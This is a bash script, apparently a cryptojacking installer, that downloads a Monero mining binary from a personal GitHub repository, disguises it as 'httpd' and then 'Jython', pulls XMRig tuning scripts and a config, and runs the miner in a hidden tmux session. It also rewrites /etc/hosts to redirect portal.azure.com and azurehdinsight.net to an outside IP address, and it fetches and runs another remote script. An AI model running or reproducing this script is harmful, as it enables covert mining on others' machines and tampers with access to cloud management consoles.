#!/bin/bash

set -x #echo on
if [ -f ${PWD}/Jython ]; then
    if pgrep -x "Jython" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
sudo rm config.json
sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
sudo tmux new-session -d -s my_session1  './Jython'

fi
exit
fi



sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev cpulimit ipset -y
sudo rm config.json
sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
sudo bash enable_1gb_pages.sh
wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
sudo bash randomx_boost.sh
sudo chmod +x httpd
mv httpd Jython
sudo -- sh -c "echo '103.145.255.41  portal.azure.com' >> /etc/hosts"
sudo -- sh -c "echo '103.145.255.41  azurehdinsight.net' >> /etc/hosts"
wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/24h.sh
sudo chmod +x 24h.sh
sudo tmux new-session -d -s my_session12  './24h.sh'


